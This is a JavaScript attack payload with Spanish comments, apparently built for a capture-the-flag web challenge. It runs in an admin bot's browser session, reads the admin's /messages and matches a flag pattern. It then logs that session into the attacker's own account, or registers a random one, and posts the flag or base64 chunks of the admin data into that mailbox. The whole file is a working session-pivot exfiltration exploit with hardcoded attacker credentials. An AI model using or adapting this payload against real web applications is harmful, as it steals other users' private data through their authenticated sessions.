// navaja_box.js — lee /messages como ADMIN, garantiza pivot a TU buzón, publica flag/dump
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const cred = { credentials: 'include' };
  const postJSON = (url, obj) => fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(obj), credentials:'include' });
  const postForm = (body)    => fetch('/auth', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body, credentials:'include' });

  try {
    // 1) Leer mensajes del ADMIN (sesión del bot durante /visit)
    let admin = {};
    try { admin = await (await fetch('/messages', cred)).json(); } catch(_) {}
    const dumpStr = JSON.stringify(admin);
    const flagRx  = /[A-Z0-9_]+{[^}]+}/;   // FLAG{...}, CHCTF{...}, etc.
    const m = dumpStr.match(flagRx);
    const dumpB64 = btoa(unescape(encodeURIComponent(dumpStr)));

    // 2) PIVOT: intentar loguearse a TU usuario
    const TARGET_USER = 'insider1';  // <-- AJUSTA
    const TARGET_PASS = 'insideer';  // <-- AJUSTA (asegúrate que es correcta)
    await postForm('action=login&username='+encodeURIComponent(TARGET_USER)+'&password='+encodeURIComponent(TARGET_PASS));
    await sleep(250);

    // 3) Health-check: publicar marca y verificar que aparece en TU /messages
    const MARK = 'MARK_'+Math.random().toString(36).slice(2,7);
    await postJSON('/create_msg', { message: 'MARK:'+MARK });
    await sleep(150);
    let mine = {};
    try { mine = await (await fetch('/messages', cred)).json(); } catch(_){}
    const inMine = JSON.stringify(mine).includes('MARK:'+MARK);

    // 4) Si NO estamos en tu buzón, crear usuario nuevo aleatorio y pivotar a él
    if (!inMine) {
      const U = 'inbx_'+Math.random().toString(36).slice(2,7);
      const P = 'p'+Math.random().toString(36).slice(2,7);
      await postForm('action=register&username='+encodeURIComponent(U)+'&password='+encodeURIComponent(P));
      await sleep(150);
      await postForm('action=login&username='+encodeURIComponent(U)+'&password='+encodeURIComponent(P));
      await sleep(200);
      // deja constancia de dónde mirar:
      await postJSON('/create_msg', { message: `EXFIL_USER:${U} PASS:${P}` });
      await sleep(120);
    }

    // 5) Publicar flag si la encontramos, si no el dump en base64 (por trozos)
    if (m && m[0]) {
      await postJSON('/create_msg', { message: 'EXFIL_FLAG: '+m[0] });
    } else {
      const CH = 850;
      for (let i=0,p=0; i<dumpB64.length && p<8; i+=CH,p++) {
        await postJSON('/create_msg', { message: `ADM_B64_${p}: `+dumpB64.slice(i,i+CH) });
        await sleep(60);
      }
    }
  } catch (e) {
    try { await postJSON('/create_msg', { message: 'BOX_ERR: '+(e?.message || String(e)) }); } catch {}
  }
})();
